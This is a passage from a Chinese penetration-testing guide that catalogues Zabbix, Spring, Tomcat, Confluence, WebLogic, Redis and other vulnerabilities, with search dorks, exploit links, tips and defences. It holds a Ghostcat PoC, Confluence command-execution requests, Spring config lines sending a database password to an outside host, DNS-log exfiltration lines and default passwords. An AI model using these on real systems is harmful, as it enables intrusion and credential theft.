WooYun-2014-57890 | WooYun.org https://php.mengsec.com/bugs/wooyun-2014-057890.html\n7. 利用技巧\n1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5\n2.邮件系列老洞\n高屋建瓴之WebMail攻与防 – cyjay5un – 博客园 https://www.cnblogs.com/cyjaysun/p/4378907.html\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版\nZabbix 相关漏洞 1. 漏洞简介\nZabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行\n2. 影响组件\nZabbix\n3. 漏洞指纹\nZabbix\n4. Fofa Dork\napp=\u0026quot;Zabbix\u0026quot;\n5. 漏洞分析\n记一次zabbix安装及漏洞利用getshell全过程 – 先知社区 https://xz.aliyun.com/t/6874\nZabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/\n6. 漏洞利用\n记一次zabbix安装及漏洞利用getshell全过程 – 先知社区 https://xz.aliyun.com/t/6874\nZabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/\n7. 利用技巧\n1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了\n2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事\n8. 防护方法\n1.设置强口令\n2.尽量不要开放到公网\n3.限制来源IP\n4.升级到最新版\n边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞 1. 漏洞简介\n大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主\n2. 影响组件\n防火墙, 网关, 路由器, VPN\n3. 漏洞指纹\n防火墙, 网关, 路由器, VPN\n4. Fofa Dork 防火墙, 网关, 路由器, VPN 的名称\n5. 漏洞分析\n【安全设备】常见网络安全设备默认口令|IT2021.Com https://www.it2021.com/security/614.html\n渗透测试之各厂商防火墙登录IP、初始密码、技术支持 https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA\n6. 漏洞利用\n【安全设备】常见网络安全设备默认口令|IT2021.Com https://www.it2021.com/security/614.html\n渗透测试之各厂商防火墙登录IP、初始密码、技术支持 https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA\n7. 利用技巧\n1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令\nadmin root 123456 永远的神\n内网的安全平台就是个漏洞指南\n8. 防护方法\n1.设置强口令\n2.限制来源IP\n第三节 本节主要是针对一些常见组件和中间件的相关漏洞(大部分是要结合环境利用), 这里肯定篇幅有限, 难免有所遗漏, 欢迎补充\nThinkphp 相关漏洞 1. 漏洞简介\nThinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题\n2. 影响组件 Thinkphp\n3. 漏洞指纹\nThinkphp\nX-Powered-By: ThinkPHP\n4. Fofa Dork\napp=\u0026quot;ThinkPHP\u0026quot;\n5. 漏洞分析\nThinkPHP漏洞总结 – 赛克社区 http://zone.secevery.com/article/1165\n挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心 https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/\nThinkPHP使用不当可能造成敏感信息泄露PHP_Fly鹏程万里-CSDN博客 https://blog.csdn.net/Fly_hps/article/details/81201904\nDSMall代码审计 – 安全客，安全资讯平台 https://www.anquanke.com/post/id/203461\n6. 漏洞利用\nSkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合 https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection\nDido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写 https://github.com/Dido1960/thinkphp\nwhirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具 https://github.com/whirlwind110/tphack\n7. 利用技巧\n1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露\n2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中\n3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞\nDSMall代码审计 – 安全客，安全资讯平台 https://www.anquanke.com/post/id/203461\n8. 防护方法\n1.及时更新补丁\n2.升级到最新版Thinkphp\n3.前置WAF进行防护\nSpring 系列漏洞 1. 漏洞简介\nSpring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒\n2. 影响组件 Spring xxx\n3. 漏洞指纹\nX-Application-Context:\n4. Fofa Dork\napp=\u0026quot;Spring-Framework\u0026quot;\n5. 漏洞分析\nSpring 框架漏洞集合 ~ Misaki’s Blog https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/\nExploiting Spring Boot Actuators | Veracode blog https://www.veracode.com/blog/research/exploiting-spring-boot-actuators\nSpring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/\n6. 漏洞利用\nmpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE https://github.com/mpgn/Spring-Boot-Actuator-Exploit\nartsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads https://github.com/artsploit/yaml-payload\n7. 利用技巧\n1.Spring Boot Actuators 相关漏洞超级好用\n很多厂商一开始都不懂, 直接对外开放Spring Boot Actuators, 造成了有一段时间每个用了Spring Boot的厂商都出了问题\n尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个Spring Boot启动的服务\n然后子目录比如 http://123.123.123.123/admin/env , http://123.123.123.123/manager/env也都是可以出现的\n/env 可以偷session, RCE\n/heapdump 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象\n可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 /trace /health /loggers /metrics /autoconfig /heapdump /threaddump /env /info /dump /configprops /mappings /auditevents /beans /jolokia /cloudfoundryapplication /hystrix.stream /actuator /actuator/auditevents /actuator/beans /actuator/health /actuator/conditions /actuator/configprops /actuator/env /actuator/info /actuator/loggers /actuator/heapdump /actuator/threaddump /actuator/metrics /actuator/scheduledtasks /actuator/httptrace /actuator/mappings /actuator/jolokia /actuator/hystrix.stream /monitor /monitor/auditevents /monitor/beans /monitor/health /monitor/conditions /monitor/configprops /monitor/env /monitor/info /monitor/loggers /monitor/heapdump /monitor/threaddump /monitor/metrics /monitor/scheduledtasks /monitor/httptrace /monitor/mappings /monitor/jolokia /monitor/hystrix.stream 这里通过 /env + /refresh 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作\n里面就有操作空间, 很像fastjson反序列化\n2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok\nspringboot Information Disclosure https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3\neureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000\nspring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml\n3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群\neureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了\n8. 防护方法\n1.及时更新补丁\n2.开启Spring Boot Actuators权限校验\n3.前置WAF进行防护\nPhpstudy 后门远程代码执行 1. 漏洞简介\nPhpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器\n2. 影响组件\nPhpstudy\n3. 漏洞指纹\nphpStudy 探针\n4. Fofa Dork\napp=\u0026quot;phpStudy 探针\u0026quot;\n5. 漏洞分析\nPhpStudy 后门分析 https://paper.seebug.org/1044/\n6. 漏洞利用\nNS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本 https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp\n7. 利用技巧\n1.phpstudy 根目录下面有个l.php , 里面有探针, 可以作为判断条件\n2.还有个/phpmyadmin目录, 一般密码都是root/root 后台mysql outfile 写 shell 就ok了\n8. 防护方法\n1.及时删除phpstudy\n2.升级到最新版\n3.不要用phpstduy搭建生产环境\nStruts 系列漏洞 1. 漏洞简介\nStruts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在\n2. 影响组件 Struts\n3. 漏洞指纹\nStruts\n.action\n.do\n.action!xxxx\nstruts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check https://github.com/coffeehb/struts2_check/\n4. Fofa Dork\napp=\u0026quot;Struts2\u0026quot; (这个不太准)\n5. 漏洞分析\nStruts2代码执行漏洞整理 – 简书 https://www.jianshu.com/p/d7cd8a2a992b\n6. 漏洞利用\nstruts-scan/struts-scan.py at master · Lucifer1993/struts-scan\nhttps://github.com/Lucifer1993/struts-scan/\n7. 利用技巧\n1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜\n8. 防护方法\n1.升级到最新版\n2.不建议使用Struts\nSolr 系列漏洞 1. 漏洞简介\nSolr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,\n2. 影响组件\nSolr\n3. 漏洞指纹\nSolr\n4. Fofa Dork\napp=\u0026quot;Solr\u0026quot;\n5. 漏洞分析\nApache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/vuls/218730.html\nApache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析 https://paper.seebug.org/1009/\n6. 漏洞利用\nveracode-research/solr-injection: Apache Solr Injection Research https://github.com/veracode-research/solr-injection\njas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”) https://github.com/jas502n/CVE-2019-12409\nmogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit https://github.com/mogwailabs/mjet\n7. 利用技巧\n1.看到锤就完事了, 漏洞太多了, 一片一片的\n2.遇到mjet连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用socat进行流量转发, 后记里面有具体操作\n8. 防护方法\n1.升级到最新版\n2.不要对外开放敏感端口\nTomcat 本地文件包含漏洞 (CVE-2020-1938) 1. 漏洞简介\nTomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效\n2. 影响组件\nApache Tomcat 6\nApache Tomcat 7 \u0026lt; 7.0.100\nApache Tomcat 8 \u0026lt; 8.5.51\nApache Tomcat 9 \u0026lt; 9.0.31\n3. 漏洞指纹\ntomcat\n8009\najp\n\\x04\\x01\\xf4\\x00\\x15\n4. Fofa Dork\nprotocol=\u0026quot;ajp\u0026quot;\n5. 漏洞分析\nApache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心 https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/\n6. 漏洞利用\n0nise/CVE-2020-1938: CVE-2020-1938 https://github.com/0nise/CVE-2020-1938\n7. 利用技巧\n1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了\n主要代码也就这\n1 2 3 4 5 6 7 8 t = Tomcat(\u0026#34;127.0.0.1\u0026#34;, 8009) _, data = t.perform_request(\u0026#39;/\u0026#39;, attributes=[ {\u0026#39;name\u0026#39;: \u0026#39;req_attribute\u0026#39;, \u0026#39;value\u0026#39;: [\u0026#39;javax.servlet.include.request_uri\u0026#39;, \u0026#39;/\u0026#39;]}, {\u0026#39;name\u0026#39;: \u0026#39;req_attribute\u0026#39;, \u0026#39;value\u0026#39;: [\u0026#39;javax.servlet.include.path_info\u0026#39;, \u0026#34;/WEB-INF/web.xml\u0026#34;]}, {\u0026#39;name\u0026#39;: \u0026#39;req_attribute\u0026#39;, \u0026#39;value\u0026#39;: [\u0026#39;javax.servlet.include.servlet_path\u0026#39;, \u0026#39;/\u0026#39;]}, ]) print(\u0026#39;----------------------------\u0026#39;) print(\u0026#34;\u0026#34;.join([bytes.decode(d.data) for d in data])) 2.通过修改这里的路径可以进行Webapp切换, 默认是ROOT/, 需要切换应用就改成 /admin/ 之类的\n3.通常检测的时候, 尽量保持t.perform_request('/' , 有的poc喜欢用 /addsd 这种的不存在的路径, 有些情况会读不到文件\n8. 防护方法\n1.升级到最新版\n2.屏蔽8009端口对外开放\nPHP-FPM 远程代码执行漏洞 1. 漏洞简介\n国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞\n2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行\n2. 影响组件\nNginx + FPM + PHP7\n3. 漏洞指纹\nNginx\nPHP\nnextcloud\n4. Fofa Dork\n5. 漏洞分析\nPHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析 https://paper.seebug.org/1063/\n6. 漏洞利用\nneex/phuip-fpizdam: Exploit for CVE-2019-11043 https://github.com/neex/phuip-fpizdam\njas502n/CVE-2019-11043: php-fpm+Nginx RCE https://github.com/jas502n/CVE-2019-11043\n7. 利用技巧\n1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502\nk8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix) https://github.com/k8gege/CVE-2019-11043\n2.Nextcloud 这个应用的默认配置就存在漏洞\n8. 防护方法\n1.升级到最新版php\n2.修改nginx配置\nCVE-2019-3396 Confluence Wiki 远程代码执行 1. 漏洞简介\nConfluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行\n2. 影响组件\nConfluence\n3. 漏洞指纹\nConfluence\n4. Fofa Dork\napp=\u0026quot;Confluence\u0026quot;\n5. 漏洞分析\nConfluence 未授权 RCE (CVE-2019-3396) 漏洞分析 https://paper.seebug.org/884/\nAtlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心\nAtlassian Confluence 远程代码执行漏洞分析\n6. 漏洞利用\njas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞 https://github.com/jas502n/CVE-2019-3396\n7. 利用技巧\n1.本地写日志的方式getshell\n这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了\n这里的远程模板加载不支持http协议, 主要是classloader的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell\n这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持file协议可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符\nvelocity比php语法要相对严格一点, 可能会报错, 而且velocity渲染的时候, 目标文件不能太大, 但是极端情况可以试一下\n1 2 3 4 5 6 7 8 GET /synchrony/heartbeat HTTP/1.1 Host: localhost:8091 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html, */*; q=0.01 Accept-Language: en-US, en;q=0.5 Referer: http://localhost:8091 Connection: close x-forwarded-for: $i18n.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;getRuntime\u0026#39;, null).invoke(null, null).exec(\u0026#39;gnome-calculator\u0026#39;).waitFor() 1 2 3 4 5 6 7 8 9 10 11 12 POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html, */*; q=0.01 Accept-Language: en-US, en;q=0.5 Referer: http://localhost:8090/ Content-Type: application/json; X-Requested-With: XMLHttpRequest Content-Length: 258 Connection: close {\u0026#34;contentId\u0026#34;:\u0026#34;65594\u0026#34;, \u0026#34;macro\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;widget\u0026#34;, \u0026#34;body\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;params\u0026#34;:{\u0026#34;url\u0026#34;:\u0026#34;http://www.dailymotion.com/video/xcpa64?_template=/etc/passwd\u0026#34;, \u0026#34;width\u0026#34;:\u0026#34;300\u0026#34;, \u0026#34;height\u0026#34;:\u0026#34;200\u0026#34;, \u0026#34;_template\u0026#34;:\u0026#34;file:/var/atlassian/application-data/confluence/logs/atlassian-synchrony.log\u0026#34;}}} 8. 防护方法\n1.升级到最新版\n2.尽量不要开放到公网\n3.限制来源IP\nGhostscript 上传图片代码执行 1. 漏洞简介\nGhostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招\n2. 影响组件\nimagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用\n3. 漏洞指纹\n.ps/.jpg/.png\n4. Fofa Dork\n5. 漏洞分析\nghostscript命令执行漏洞预警 – 安全客, 安全资讯平台 https://www.anquanke.com/post/id/157513\n6. 漏洞利用\nExploit Database Search https://www.exploit-db.com/search?q=Ghostscript\nvulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116\n7. 利用技巧\n1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行\ndnslog 可以用 ping uname.admin.ceye.io 或 ping whoami.admin.ceye.io\n保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造\nping whoami.centos.admin.ceye.io / ping whoami.ubuntu.admin.ceye.io\n分别命名为 centos_ps.jpg/ubuntu_ps.jpg, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的\n8. 防护方法\n1.升级到最新版\nJboss 相关漏洞 1. 漏洞简介\nJBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响\n2. 影响组件\nJboss\n3. 漏洞指纹\nJboss\n4. Fofa Dork\napp=\u0026quot;JBoss\u0026quot;\n5. 漏洞分析\n打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/vuls/186948.html\n6. 漏洞利用\njoaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool https://github.com/joaomatosf/jexboss\nPerun/vuln/jboss at master · WyAtu/Perun https://github.com/WyAtu/Perun/tree/master/vuln/jboss\n7. 利用技巧\n1.Jboss的漏洞在内网还是相对比较常见的, 试过几次jexboss, 效果还ok\n8. 防护方法\n1.设置强口令\n2.尽量不要开放到公网\n3.限制来源IP\n4.升级到最新版\nWebsphere 反序列化远程代码执行 1. 漏洞简介\nWebsphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),\n近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)\n2. 影响组件\nWebSphere\n3. 漏洞指纹\nWebSphere\n8880\n4. Fofa Dork\napp=\u0026quot;IBM-WebSphere\u0026quot;\n5. 漏洞分析\nWhat Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability. https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere\nWebsphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区 https://xz.aliyun.com/t/6394\n6. 漏洞利用\njava-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py\nWebsphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区 https://xz.aliyun.com/t/6394\n7. 利用技巧\n1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的\nTomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区 https://xz.aliyun.com/t/309\n8. 防护方法\n1.设置强口令\n2.尽量不要开放到公网\n3.限制来源IP\n4.升级到最新版\nJenkins 系列漏洞 1. 漏洞简介\nJenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令\n2. 影响组件\nJenkins\n3. 漏洞指纹\nJenkins\n4. Fofa Dork\napp=\u0026quot;Jenkins\u0026quot;\n5. 漏洞分析\nJenkins RCE漏洞分析汇总 http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool\u0026amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ\nJenkins漏洞集合复现 ~ Misaki’s Blog https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/\n6. 漏洞利用\nJenkins漏洞集合复现 ~ Misaki’s Blog https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/\nblackye/Jenkins: Jenkins漏洞探测、用户抓取爆破 https://github.com/blackye/Jenkins\ngquere/pwn_jenkins: Notes about attacking Jenkins servers\nhttps://github.com/gquere/pwn_jenkins\n7. 利用技巧\n1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大\n8. 防护方法\n1.设置强口令\n2.尽量不要开放到公网\n3.限制来源IP\n4.升级到最新版\nRMI 对外开放 1. 漏洞简介\nJava RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集\n通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.\n2. 影响组件\njava*\n3. 漏洞指纹\n1098, 1099, 1090, 8901, 8902, 8903\nN\\x00\nrmiregistry\n4. Fofa Dork\nprotocol==\u0026quot;java-rmi\u0026quot;\n5. 漏洞分析\nRMI-反序列化 – 先知社区 https://xz.aliyun.com/t/6660\n6. 漏洞利用\nJenkins漏洞集合复现 ~ Misaki’s Blog https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/\nJava RMI服务远程命令执行利用_91Ri.org http://www.91ri.org/15276.html\n7. 利用技巧\n1.rmi一般在内网开放的比较多, nmap 扫描如下\nnmap -v 8.8.8.8 -p1099 -sV --script=rmi*\n8. 防护方法\n1.设置强口令\n2.尽量不要开放到公网\n3.限制来源IP\nWeblogic T3 协议漏洞 1. 漏洞简介\nWeblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.\n2. 影响组件\nWeblogic\n3. 漏洞指纹\nLcom.tangosol.util.extractor.ReflectionExtractor\n…\n4. Fofa Dork\nprotocol==\u0026quot;weblogic\u0026quot;\n5. 漏洞分析\n相关漏洞有:\nCVE-2017-3248 https://paper.seebug.org/333/\nCVE-2018-2628 http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/\nCVE-2018-2893 https://www.freebuf.com/vuls/178105.html\nCVE-2019-2890 https://paper.seebug.org/1069/\nCVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/\n除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞. https://www.oracle.com/security-alerts/cpuapr2020.html\n6. 漏洞利用\nweblogic 漏洞扫描工具 https://github.com/0xn0ne/weblogicScanner\nCVE-2020-2555 https://github.com/Y4er/CVE-2020-2555\n7. 利用技巧\n1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap\nnmap -sV --script=weblogic-t3-info.nse -p 7001\n2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用\nBort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners. https://github.com/Bort-Millipede/WLT3Serial\n8. 防护方法\n1.及时更新补丁 2.禁用T3协议 3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源\nWeblogic XMLDecoder反序列化 1. 漏洞简介\n2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.\n2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.\n2. 影响组件\nWebLogic 10.X\nWebLogic 12.1.3\n3. 漏洞指纹\n/wls-wsat/CoordinatorPortType /_async/AsyncResponseService /_async/AsyncResponseServiceSoap12\n4. Fofa Dork\napp=\u0026quot;WebLogic-Server\u0026quot;\n5. 漏洞分析\n（CVE-2017-3506 \u0026amp;CVE-2017-10271） http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/\nCVE-2019-2725 https://paper.seebug.org/909/\n6. 漏洞利用 weblogicScanner https://github.com/0xn0ne/weblogicScanner\n7. 利用技巧\n1.由于nginx转发问题, 尝试这种路径, 可能有惊喜\n/../wls-wsat/CoordinatorPortType11 /../_async/AsyncResponseService\n2.Weblogic 写shell有个技巧\n可以通过find/grep命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的logo.png / /static/css/main.css\n8. 防护方法\n1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；\n2.删除对应war包并重启 webLogic；\n3.限制源IP对应 weblogic 7001端口的访问.\nWeblogic IIOP 1. 漏洞简介\n2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.\n2. 影响组件\nOracle WebLogic Server version:\n10.3.6.0.0\n12.1.3.0.0\n12.2.1.3.0 and 12.2.1.4.0\n3. 漏洞指纹\nGIOP \u0026amp;\u0026amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager\n4. Fofa Dork\napp=\u0026quot;WebLogic-Server\u0026quot;\n5. 漏洞分析\nWebLogic CVE-2020-2551漏洞分析 https://paper.seebug.org/1138/\n6. 漏洞利用\nY4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551 https://github.com/Y4er/CVE-2020-2551\n7. 利用技巧\n漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台 https://www.anquanke.com/post/id/201005\n8. 防护方法\n1.及时更新补丁\n2.通过 Weblogic 控制台进行关闭 IIOP 协议\nRedis 相关漏洞 1. 漏洞简介\nRedis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作\n2. 影响组件\nRedis\n3. 漏洞指纹\n6379\n4. Fofa Dork\napp=\u0026quot;Redis\u0026quot; \u0026amp;\u0026amp; \u0026quot;redis_version\u0026quot;\n5. 漏洞分析\nRedis 基于主从复制的 RCE 利用方式 https://paper.seebug.org/975/\n6. 漏洞利用\nn0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules! https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\n7. 利用技巧\n1.当Redis 权限满足写文件时\nlinux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell\n2.当Redis 权限不满足写文件时\n发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞\n发现Redis记录中存在AC ED这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据\n8. 防护方法\n1.Redis 